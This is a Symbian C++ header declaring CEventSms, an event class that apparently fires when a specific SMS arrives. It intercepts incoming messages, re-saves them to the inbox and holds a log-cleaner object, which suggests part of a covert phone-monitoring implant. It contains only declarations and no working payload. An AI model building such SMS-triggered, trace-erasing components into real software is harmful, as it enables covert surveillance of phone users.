/*
 ============================================================================
 Name		: EventSms.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CEventSms declaration
 ============================================================================
 */

#ifndef EVENTSMS_H
#define EVENTSMS_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>
#include <es_sock.h>	// for RSocketServ
#include <etel3rdparty.h>
#include <msvapi.h>
#include <msvstd.h>

#include <HT\LogCleaner.h>

#include "RecvSmsSocket.h"
#include "AbstractEvent.h"

// CLASS DECLARATION

/**
 *  CEventSms
 * 
 */
class CEventSms : public CAbstractEvent, public MSmsRecvHandler, public MMsvSessionObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CEventSms();

	/**
	 * Two-phased constructor.
	 */
	static CEventSms* NewL(const TDesC8& params, TUint32 aTriggerId);

	/**
	 * Two-phased constructor.
	 */
	static CEventSms* NewLC(const TDesC8& params, TUint32 aTriggerId);

protected:
	// From CAbstractEvent
	/**
	 * Events MUST implement this method to start their task.
	 */
	virtual void StartEventL();

private: // from MMsvSessionObserver
	void HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* /*aArg3*/);

private: // From MSmsRecvHandler:
	virtual void IncomingSmsL(const TAny* src, const TDesC& aFromNumber, const TDesC& aData);

private:
	void SaveToInBoxL(const TDesC& sender, const TDesC& msg);

	/**
	 * Constructor for performing 1st stage construction
	 */
	CEventSms(TUint32 aTriggerId);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	CTelephony::TTelNumber iSmsNumber;
	TBuf<140> iSmsText;
	CSmsReceiverSocket* iSmsRecv;
	CLogCleaner* iLogCleaner;
	RSocketServ iSocketServ;
	RFs iFs;
	};

#endif // EVENTSms_H
